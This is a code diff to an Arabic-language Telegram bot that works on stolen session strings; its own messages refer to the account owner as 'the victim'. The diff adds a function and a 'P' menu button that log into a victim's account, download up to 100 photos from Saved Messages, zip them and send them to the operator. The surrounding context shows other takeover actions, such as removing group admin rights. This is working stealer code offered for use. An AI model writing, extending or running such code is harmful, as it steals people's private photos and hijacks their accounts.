@@ -108,7 +108,30 @@ async def demall(strses, grp):
       except:
         await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
       
-
+async def get_saved_photos(strses):
+    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        photo_messages = []
+        async for message in X.iter_messages("me"):
+            if message.photo:
+                photo_info = f"📷 الصورة المرسلة في: {message.date}\n"
+                if message.text:
+                    photo_info += f"📝 النص المصاحب: {message.text}\n"
+                photo_messages.append(photo_info)
+        
+        if not photo_messages:
+            return "لا توجد صور في الرسائل المحفوظة"
+        
+        # تنزيل الصور فعلياً
+        try:
+            os.mkdir("saved_photos")
+        except:
+            pass
+            
+        async for message in X.iter_messages("me", limit=100):
+            if message.photo:
+                await message.download_media(f"saved_photos/photo_{message.id}.jpg")
+        
+        return "\n".join(photo_messages)
 
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
@@ -275,30 +298,32 @@ async def start(event):
   if event.sender_id == bot.uid:
       async with bot.conversation(event.chat_id) as x:
         keyboard = [
-          [  
-            Button.inline("A", data="A"), 
-            Button.inline("B", data="B"),
-            Button.inline("C", data="C"),
-            Button.inline("D", data="D"),
-            Button.inline("E", data="E")
-            ],
-          [
-            Button.inline("F", data="F"), 
-            Button.inline("G", data="G"),
-            Button.inline("H", data="H"),
-            Button.inline("I", data="I"),
-            Button.inline("J", data="J")
-            ],
-          [
-            Button.inline("K", data="K"), 
-            Button.inline("L", data="L"),
-            Button.inline("M", data="M"),
-            Button.inline("N", data="N"),
-            Button.inline("X", data="X")
-            ],
-          [
-            Button.url("المـطور", "https://t.me/Lx5x5")
-            ]
+    [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+    ],
+    [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+    ],
+    [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M"),
+        Button.inline("N", data="N"),
+        Button.inline("O", data="O"),
+        Button.inline("P", data="P")  # الزر الجديد للصور
+    ],
+    [
+        Button.inline("X", data="X"),
+        Button.url("المـطور", "https://t.me/Lx5x5")
+    ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
     
@@ -463,6 +488,40 @@ async def users(event):
       	await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك ايــڪاࢪ.", buttons=keyboard)
       else:
           await event.reply(f"حدث خطأ قم بتوجيه الرسالة للمطور @Ze_in22\n{i}")
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"P")))
+async def users(event):
+    async with bot.conversation(event.chat_id) as x:
+        await x.send_message("الان ارسل الكود تيرمكس")
+        strses = await x.get_response()
+        op = await cu(strses.text)
+        if not op:
+            return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحية.", buttons=keyboard)
+        
+        await event.respond("جاري جمع الصور من الرسائل المحفوظة...")
+        
+        try:
+            # تنظيف المجلد القديم إذا وجد
+            if os.path.exists("saved_photos"):
+                shutil.rmtree("saved_photos")
+            
+            result = await get_saved_photos(strses.text)
+            
+            if os.path.exists("saved_photos"):
+                # ضغط المجلد في ملف zip
+                shutil.make_archive("photos", 'zip', "saved_photos")
+                
+                # إرسال الملف المضغوط
+                await event.respond("تم جمع الصور بنجاح:\n\n" + result, file="photos.zip")
+                
+                # تنظيف الملفات المؤقتة
+                os.remove("photos.zip")
+                shutil.rmtree("saved_photos")
+            else:
+                await event.respond(result)
+                
+        except Exception as e:
+            await event.respond(f"حدث خطأ: {str(e)}")
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
